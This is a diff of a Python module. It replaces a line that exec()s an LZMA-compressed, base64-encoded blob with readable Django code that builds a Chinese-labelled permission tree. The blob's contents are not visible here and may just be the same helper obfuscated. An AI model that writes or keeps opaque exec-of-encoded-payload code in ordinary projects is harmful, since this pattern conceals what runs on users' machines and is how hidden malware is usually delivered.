@@ -1,2 +1,66 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AbGAi1dADMciiJvqlzh/FMS3SwKtV78dDZIXDGcccXv1IklbPzApbuRhH2Al0ikk/XArxJKRYnwszWLzhiWrmwbI+Qro7VVj0CnivPvGwxk4X+H6Ni96RZThjRpco1GwAX+GgfEk8+i9d68AKF5TuPtUJ3jOMD0A+9CiefcF7SM5EHnStJv8vyhmHDTd+ugare40SIm6JQdOetw59Tc6dC/d2dPbdLITELkzLosMwApjqFy6uw4gmFsEn7lntZKke26R9iMuPzpcIESvX5c6z60Ciq/060zoS9SAErzXiJoLTjwqvDenVi/oryISQKapmIOsfaCTM2WrJZRYaKIxy+kozP1D8bZYfrwFnAbpSkvo1c2J+A3nQQhXp/FIM+6s90NouuumqRi64dbYrhoDuW9Bmhq2jtV4YCs0cRkh54MRdA6v3y0IpywVTm1y032mv6o04NVmozaThoKI3bT+d36t90pAp0TDXhAijBw49RcYAqcLatsSmbSftLo8Pkt+6DtbRUqchSL6vNG62m5ib+J7WRkSH693ZiwQm7/wI0BOGu2lenwWrLT5fo0tAHE5PWspDLNgdG70bdDG06LkfRETuPCTfbEhJGj4rkBtY0Cgj5jvNgGXUb0nEtPRooHYzt4Kgp7wFOh6UHzh8iG+ARj5MZKSCit4pb25/1r9YyKEMBQ9AenQnwKy+m3l7w7HcOvBim3JoTEMvuqOurKdrJ0fMZmor67Z7kI1Eij6snLMnMAAAAAAAs6eTxjj4+gAAHJBMcNAACNeHDjscRn+wIAAAAABFla')))
+from django.contrib.auth.models import Permission
+
+
+def get_action_name(name):
+    """
+    汉化
+    :param name:
+    :return:
+    """
+    name = name.replace('Can add ', '增加').replace('Can change ', '编辑').replace('Can delete ', '删除').replace('Can view ',
+                                                                                                            '查看')
+    return name
+
+
+def get_permissions():
+    """
+    获取所有的权限
+    :return:
+    """
+    all = Permission.objects.all()
+
+    data = {}
+
+    for item in all:
+        label = item.content_type.app_label
+        if label not in data:
+            data[label] = {
+                'label': label,
+                'children': [item]
+            }
+        else:
+            d = data.get(label)
+            children = d.get('children')
+            children.append(item)
+
+    for key in data:
+        item = data.get(key)
+        children = item.get('children')
+
+        obj = {}
+        for i in children:
+
+            label = i.content_type.name
+            if label not in obj:
+                obj[label] = {
+                    'label': label,
+                    'children': [{
+                        'id': i.id,
+                        'label': get_action_name(i.name)
+                    }]
+                }
+            else:
+                obj[label].get('children').append({
+                    'id': i.id,
+                    'label': get_action_name(i.name)
+                })
+        array = []
+        for i in obj:
+            array.append(obj.get(i))
+        item['children'] = array
+
+    jsonData = []
+    for i in data:
+        jsonData.append(data.get(i))
+
+    return jsonData
